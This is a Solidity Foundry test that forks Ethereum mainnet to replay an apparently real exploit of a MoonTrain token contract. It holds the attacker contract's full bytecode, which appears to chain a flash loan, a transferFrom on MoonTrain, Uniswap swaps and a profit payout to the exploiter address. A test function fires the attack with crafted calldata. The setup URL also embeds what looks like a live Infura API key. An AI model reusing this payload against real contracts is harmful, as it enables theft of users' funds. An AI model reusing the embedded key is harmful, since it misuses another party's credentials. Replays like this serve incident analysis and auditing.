// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import {MoonTrain} from "src/MoonTrain.sol";

contract MoonTrainTest is Test {
    uint256 forkId;
    MoonTrain public moonTrain = MoonTrain(0x3228024b4878283920D259E7Ee97a69fD2D4b8A7);
    address public exploiter = 0x80085CA31F9fF45126ead9cbB591b6B57b580085;
    address public attacker = 0x43bBEF399825ba43812208dD27E168B3BA58586F;

    function setUp() public {
        forkId = vm.createSelectFork("https://mainnet.infura.io/v3/a221e1d3d6984f6c8b7e12e5ce671c76", 17296034);
        // bytes memory code =
        //     hex"6080604052600436101561001a575b3615610018575f80fd5b005b5f803560e01c8063715018a614610e4d57806382bfefc814610e005780638b4187131461074e5780638da5cb5b146106fd5780639ab603b91461019d5763f2fde38b14610067575061000e565b3461019a5760207ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffc36011261019a5761009e610ee9565b6100a661101b565b73ffffffffffffffffffffffffffffffffffffffff809116908115610116575f54827fffffffffffffffffffffffff00000000000000000000000000000000000000008216175f55167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e05f80a380f35b60846040517f08c379a000000000000000000000000000000000000000000000000000000000815260206004820152602660248201527f4f776e61626c653a206e6577206f776e657220697320746865207a65726f206160448201527f64647265737300000000000000000000000000000000000000000000000000006064820152fd5b80fd5b5060207ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffc36011261019a576101d061101b565b604051906101dd82610f86565b60038252805b60609081811015610251576040516020926101fd82610f69565b848252848483015260405161021181610f86565b85815285858201528560408201528582820152604083015284818301528460808301528460a08301528460c083015260e0820152828286010152016101e3565b505060405161025f81610f86565b81815281602082015281604082015268410d586a20a4c00000908160608201526040519061028c82610f69565b6001825283602083015260408201528260608201528260808201523060a08201528260c08201526040516102bf81610fbe565b83815260e08201526102d0846110d0565b526102da836110d0565b50604051906102e882610f86565b82825282602083015282604083015282606083015260405190602082015260043560408201526040815261031b81610fa2565b6040519161032883610f69565b6008835283602084015260408301528260608301528260808301523060a08301528260c083015260e082015261035d8361110a565b526103678261110a565b5060405161037481610f86565b6001815281602082015281604082015268410d586a20a4c000026060820152604051906103a082610f69565b82825282602083015260408201528160608201528160808201523060a08201528160c08201526040516103d281610fbe565b82815260e08201526103e38361111a565b526103ed8261111a565b506040516103fa81610f0c565b60018152815b602081106106da575060405161041581610f0c565b30815260016020820152610428826110d0565b52610432816110d0565b50731e0447b19bb6ecfdae1e4ae1694b0c3659614e4e3b156106d657604051907fa67a6a4500000000000000000000000000000000000000000000000000000000825260448201604060048401528151809152602060648401920190845b81811061069e575050507ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffc828203016024830152835180825260208201916020808360051b83010196019285915b83831061052e578680878181808d038183731e0447b19bb6ecfdae1e4ae1694b0c3659614e4e5af18015610523576105135750f35b61051c90610f55565b61019a5780f35b6040513d84823e3d90fd5b90919293967fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe0828203018352875180516009811015610671579060e09183526020810151602084015260606040820151805115156040860152602081015161059581611099565b8286015260408101516105a781611099565b6080860152015160a0840152606081015160c084015260808101518284015273ffffffffffffffffffffffffffffffffffffffff60a08201511661010084015260c0810151610120840152015190610160918261014083015280518093830152885b83811061065a575050602060019281927fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe0601f610180938d85828601015201160101990193019301919392906104de565b806020809284010151610180828601015201610609565b6024897f4e487b710000000000000000000000000000000000000000000000000000000081526021600452fd5b8251805173ffffffffffffffffffffffffffffffffffffffff1685526020908101518186015260409094019390920191600101610490565b5080fd5b6020906040516106e981610f0c565b848152848382015282828501015201610400565b503461019a57807ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffc36011261019a5773ffffffffffffffffffffffffffffffffffffffff6020915416604051908152f35b503461019a5760807ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffc36011261019a57610786610ee9565b5060407fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffdc36011261019a576040516107bd81610f0c565b73ffffffffffffffffffffffffffffffffffffffff90602480358381168103610dfc57825260449060209283833591015260649384359067ffffffffffffffff808311610c7f5736602384011215610c7f578260040135908111610dd0578760405193610851887fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe0601f8601160186610fda565b8285528785019236878284010111610dcc5780878a9301853785010152604083805181010312610c7f576040905192015173c02aaa39b223fe8d0a0e5c4f27ead9083c756cc291823b15610da3576040517f2e1a7d4d0000000000000000000000000000000000000000000000000000000081528460048201528981878183885af18015610dc157610dae575b5088541690604051917f23b872dd0000000000000000000000000000000000000000000000000000000083526004830152308583015285820152733228024b4878283920d259e7ee97a69fd2d4b8a790868189818c865af18015610cd157610d77575b5060405161094e81610fa2565b600281526040368883013782610963826110d0565b528161096e8261110a565b527398bcff16d6acf256668a4033de4d073b4e1f57c231683635c9adc5dea00000908103908111610d4b576040517f7ff36ab50000000000000000000000000000000000000000000000000000000081528a60048201526080878201528a816109da60848201866111a6565b93308b830152428d8301528180737a250d5630b4cf539739df2c5dacb4c659f2488d960391865af18015610d4057610d26575b5089604051917f70a0823100000000000000000000000000000000000000000000000000000000948584523060048501528a848a81845afa8015610d1b578c8a928c968693610cdc575b5090610abc8887989993610a6c8996956110d0565b528b610a778261110a565b5260a06040519a8b998a9889977f18cbafe5000000000000000000000000000000000000000000000000000000008952600489015287015285015260a48401906111a6565b90309083015242608483015203925af18015610cd157610caf575b5060028301809311610c8357813b15610c7f57876040517fd0e30db0000000000000000000000000000000000000000000000000000000008152818160048188885af1801561052357610c6b575b5050478015610c105788808080937380085ca31f9ff45126ead9cbb591b6b57b58008582f115610c05578590846040518094819382523060048301525afa908115610c05578791610bd4575b5003610b7b578480f35b9060117f43414e4e4f54205245504159204c4f414e00000000000000000000000000000092604051947f08c379a00000000000000000000000000000000000000000000000000000000086526004860152840152820152fd5b90508481813d8311610bfe575b610beb8183610fda565b81010312610bfa57515f610b71565b5f80fd5b503d610be1565b6040513d89823e3d90fd5b87877f5061796f7574000000000000000000000000000000000000000000000000000088600689604051947f08c379a00000000000000000000000000000000000000000000000000000000086526004860152840152820152fd5b610c7490610f55565b610c7f57875f610b25565b8780fd5b83887f4e487b710000000000000000000000000000000000000000000000000000000081526011600452fd5b610cca903d808b833e610cc28183610fda565b81019061112a565b505f610ad7565b6040513d8b823e3d90fd5b965094505050508983813d8311610d14575b610cf88183610fda565b81010312610bfa57915188928c92909189918d90610abc610a57565b503d610cee565b6040513d85823e3d90fd5b610d39903d808d833e610cc28183610fda565b505f610a0d565b6040513d8d823e3d90fd5b858a7f4e487b710000000000000000000000000000000000000000000000000000000081526011600452fd5b8681813d8311610da7575b610d8c8183610fda565b81010312610da3575180151503610c7f575f610941565b8880fd5b503d610d82565b610dba90999199610f55565b975f6108de565b6040513d8c823e3d90fd5b8280fd5b83887f4e487b710000000000000000000000000000000000000000000000000000000081526041600452fd5b8480fd5b503461019a57807ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffc36011261019a576020604051733228024b4878283920d259e7ee97a69fd2d4b8a78152f35b503461019a57807ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffc36011261019a57610e8461101b565b8073ffffffffffffffffffffffffffffffffffffffff81547fffffffffffffffffffffffff000000000000000000000000000000000000000081168355167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e08280a380f35b6004359073ffffffffffffffffffffffffffffffffffffffff82168203610bfa57565b6040810190811067ffffffffffffffff821117610f2857604052565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52604160045260245ffd5b67ffffffffffffffff8111610f2857604052565b610100810190811067ffffffffffffffff821117610f2857604052565b6080810190811067ffffffffffffffff821117610f2857604052565b6060810190811067ffffffffffffffff821117610f2857604052565b6020810190811067ffffffffffffffff821117610f2857604052565b90601f7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe0910116810190811067ffffffffffffffff821117610f2857604052565b73ffffffffffffffffffffffffffffffffffffffff5f5416330361103b57565b60646040517f08c379a000000000000000000000000000000000000000000000000000000000815260206004820152602060248201527f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e65726044820152fd5b600211156110a357565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52602160045260245ffd5b8051156110dd5760200190565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52603260045260245ffd5b8051600110156110dd5760400190565b8051600210156110dd5760600190565b906020908183820312610bfa57825167ffffffffffffffff93848211610bfa570181601f82011215610bfa578051938411610f28578360051b906040519461117485840187610fda565b85528380860192820101928311610bfa578301905b828210611197575050505090565b81518152908301908301611189565b9081518082526020808093019301915f5b8281106111c5575050505090565b835173ffffffffffffffffffffffffffffffffffffffff16855293810193928101926001016111b756fea2646970667358221220f09c9901d70583fda28e704a239058519a66c7f74f2c271b5d0263348dc9002264736f6c63430008140033";
        // vm.etch(attacker, code);
    }

    // tx hash: 0x28e625ebc2fb6e9d8c389b5919a474a4066c283d1db06f84a637615c0625afa8
    function test_Exploit() public {
        vm.prank(exploiter);
        (bool succ, bytes memory returnData) =
            attacker.call{value: 2 wei}(hex"9ab603b900000000000000000000000000000000000000000044b03d9bf6b7533f1208ef");
        console.log(succ);
        console.logBytes(returnData);
    }
}
